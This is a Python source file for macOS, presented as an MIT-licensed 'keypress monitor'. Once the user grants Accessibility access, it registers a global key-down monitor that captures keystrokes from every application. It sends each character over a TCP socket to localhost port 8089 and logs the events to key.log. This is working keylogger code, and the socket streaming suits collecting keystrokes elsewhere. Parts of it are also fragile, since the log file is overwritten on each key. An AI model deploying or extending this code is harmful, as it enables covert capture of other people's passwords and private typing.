# -*- coding: utf-8 -*-
#
# cocoa_keypress_monitor.py
# Copyright © 2016 Bjarte Johansen <Bjarte.Johansen@gmail.com>
#
# The MIT License (MIT)
#
# Permission is hereby granted, free of charge, to any person obtaining
# a copy of this software and associated documentation files (the
# “Software”), to deal in the Software without restriction, including
# without limitation the rights to use, copy, modify, merge, publish,
# distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so, subject to
# the following conditions:
#
# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
# Usage:
#
# Goto System Preferences > Security & Privacy > Accessibility and add
# Python to apps allowed to control your computer. If it is not in the
# list, the easiest is to run this file first and it should appear.

from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
import socket
import sys
import getkeys

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    try:
        key = event_to_key(event)
        NSLog(u"%@", event)
        eventLogged = "{}".format(event)
        clientsocket.send(key)
        writeToFile(eventLogged)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

def writeToFile(eventLogged):
    with open("key.log", "w", 0) as myfile:
        myfile.write(eventLogged)

def event_to_key(event):
    event = "{}".format(event)
    keyIndex = event.index("char") + 7
    key = event[keyIndex]
    return key

def main():
    clientsocket.connect(('localhost', 8089))
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
  
    
if __name__ == '__main__':
    main()
